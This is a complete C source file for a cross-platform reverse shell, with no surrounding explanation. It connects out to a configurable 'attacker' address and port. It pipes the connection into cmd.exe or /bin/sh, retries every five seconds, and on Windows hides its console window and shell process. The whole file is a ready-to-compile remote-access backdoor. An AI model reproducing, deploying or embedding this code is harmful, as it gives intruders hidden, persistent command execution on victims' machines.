#include <stdio.h>
#include <string.h>

#if defined(_WIN32) || defined(WIN32)
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSESOCKET closesocket
    #define SLEEP(ms) Sleep(ms)
    typedef SOCKET SOCKETTYPE;
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <sys/wait.h>
    #define CLOSESOCKET close
    #define SLEEP(ms) usleep((ms) * 1000)
    typedef int SOCKETTYPE;
#endif

const char* ATTACKERIP = "127.0.0.1";
const int ATTACKERPORT = 25000;

int main() {
#if defined(_WIN32) || defined(WIN32)
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;
#endif

    while (1) {
#if defined(_WIN32) || defined(WIN32)
        SOCKETTYPE s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (s == INVALID_SOCKET) {
            printf("[!] server seems down. reconnecting...\n");
            SLEEP(5000);
            continue;
        }

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ATTACKERPORT);
        addr.sin_addr.s_addr = inet_addr(ATTACKERIP);

        if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            CLOSESOCKET(s);
            printf("[!] server seems down. reconnecting...\n");
            SLEEP(5000);
            continue;
        }

        printf("[+] connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = (HANDLE)s;
        si.hStdOutput = (HANDLE)s;
        si.hStdError = (HANDLE)s;

        char cmd[] = "cmd.exe";
        if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        CLOSESOCKET(s);
#else
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            printf("[!] server seems down. reconnecting...\n");
            SLEEP(5000);
            continue;
        }

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ATTACKERPORT);
        addr.sin_addr.s_addr = inet_addr(ATTACKERIP);

        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            CLOSESOCKET(s);
            printf("[!] server seems down. reconnecting...\n");
            SLEEP(5000);
            continue;
        }

        printf("[+] connected to %s:%d\n", ATTACKERIP, ATTACKERPORT);

        pid_t pid = fork();
        if (pid == 0) {
            dup2(s, 0);
            dup2(s, 1);
            dup2(s, 2);
            execl("/bin/sh", "sh", (char*)NULL);
            return 0;
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
        }

        CLOSESOCKET(s);
#endif
        printf("[+] server seems down. reconnecting...\n");
        SLEEP(5000);
    }

#if defined(_WIN32) || defined(WIN32)
    WSACleanup();
#endif
    return 0;
}
